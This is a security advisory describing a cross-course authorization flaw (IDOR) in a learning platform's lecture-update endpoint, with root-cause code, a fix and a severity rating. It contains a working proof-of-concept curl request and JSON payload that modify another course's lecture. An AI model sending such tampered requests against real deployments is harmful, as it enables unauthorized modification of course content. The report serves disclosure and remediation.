# Lecture Update IDOR / Authorization Mismatch

## Summary

The lecture update endpoint allows an attacker with editor rights in one course to update a lecture in another course.

Affected endpoint:

```http
PUT /api/lecture/lectures
```

Affected code:

- [LectureResource.java](/Users/simon/Documents/Artemis/src/main/java/de/tum/cit/aet/artemis/lecture/web/LectureResource.java#L211)

## Root Cause

The server authorizes the request against the client-supplied `course.id`, but loads the lecture to update using the separate client-supplied `id`.

Relevant flow:

```java
Course course = courseRepository.findByIdElseThrow(updatedLectureDto.course.id());
authCheckService.checkHasAtLeastRoleInCourseElseThrow(Role.EDITOR, course, null);

Lecture originalLecture = lectureRepository.findByIdElseThrow(updatedLectureDto.id());
updateLectureAttributesFromDTO(originalLecture, updatedLectureDto);
```

What is missing is a consistency check that verifies:

```text
originalLecture.getCourse().getId() == updatedLectureDto.course.id()
```

Because that check does not exist, the request can mix:

- a `course.id` the attacker is authorized for
- a `lecture.id` that belongs to a different course

## Impact

An editor in course A can modify lecture metadata in course B:

- lecture title
- description
- start and end dates
- tutorial flag
- channel name

This is a horizontal privilege escalation across courses.

## How It Works

Example:

- Victim lecture belongs to course `80`
- Attacker has editor rights in course `90`
- Victim lecture ID is `3`

The attacker sends:

```json
{
  "id": 3,
  "title": "Changed by attacker",
  "description": "Unauthorized change",
  "startDate": "2026-04-07T10:00:00.000Z",
  "endDate": "2026-04-07T12:00:00.000Z",
  "isTutorialLecture": false,
  "channelName": "attacker-channel",
  "course": {
    "id": 90
  }
}
```

Server behavior:

1. Check editor rights for course `90`
2. Load lecture `3`
3. Update lecture `3`

The server never verifies that lecture `3` actually belongs to course `90`.

## Safe Test Procedure

Use this only in a local/dev environment you control or an environment where you have explicit authorization to validate security findings.

### Setup

1. Create two courses:
   - Course A: attacker-controlled, where your test user is an editor
   - Course B: victim course
2. Create a lecture in course B
3. Note:
   - the victim lecture ID
   - the attacker-controlled course ID

### Test Request

Replace:

- `BASE_URL` with your local or authorized test system
- `SESSION` with a valid authenticated session cookie
- `VICTIM_LECTURE_ID` with the lecture from course B
- `ATTACKER_COURSE_ID` with the course where you are editor

Confirmed in an authorized test environment with a request in this form:

```bash
curl "$BASE_URL/api/lecture/lectures" \
  -X PUT \
  -H 'Content-Type: application/json' \
  -H 'Accept: application/json' \
  -H 'Cookie: jwt=YOUR_SESSION_TOKEN' \
  --data-raw '{
    "id": 3,
    "title": "lalalalalala",
    "description": "Modified from another course",
    "startDate": "2027-04-07T10:00:00.000Z",
    "endDate": "2027-04-07T12:00:00.000Z",
    "isTutorialLecture": true,
    "channelName": "attacker-renamed-channel",
    "course": {
      "id": 90
    }
  }'
```

Interpretation:

- `id: 3` is the victim lecture ID
- `course.id: 90` is a different course where the attacker has editor rights
- `jwt=YOUR_SESSION_TOKEN` is the authenticated attacker session

### Expected Secure Behavior

The server should reject the request with `403` or `400` because the lecture does not belong to the authorized course.

### Vulnerable Behavior

The response is `200 OK`, and the lecture in the foreign course is updated.

## Remediation

The server must authorize against the lecture's actual course, not the client-supplied course ID.

Safer pattern:

```java
Lecture originalLecture = lectureRepository.findByIdElseThrow(updatedLectureDto.id());
Course actualCourse = originalLecture.getCourse();

if (actualCourse == null) {
    throw new BadRequestAlertException("Lecture is not part of a course", ENTITY_NAME, "courseMissing");
}

authCheckService.checkHasAtLeastRoleInCourseElseThrow(Role.EDITOR, actualCourse, null);
```

Optionally also reject mismatched client input:

```java
if (!actualCourse.getId().equals(updatedLectureDto.course.id())) {
    throw new BadRequestAlertException("Lecture does not belong to the specified course", ENTITY_NAME, "courseMismatch");
}
```

## Recommended Fix

Update [LectureResource.java](/Users/simon/Documents/Artemis/src/main/java/de/tum/cit/aet/artemis/lecture/web/LectureResource.java#L213) so that:

1. The lecture is loaded first
2. Authorization is performed against `originalLecture.getCourse()`
3. The client-supplied `course.id` is treated as informational only, or validated strictly against the lecture's real course

## Severity

Suggested severity: High

Reason:

- cross-course privilege escalation
- direct unauthorized modification of learning content
- simple request tampering
- no race condition or special environment needed
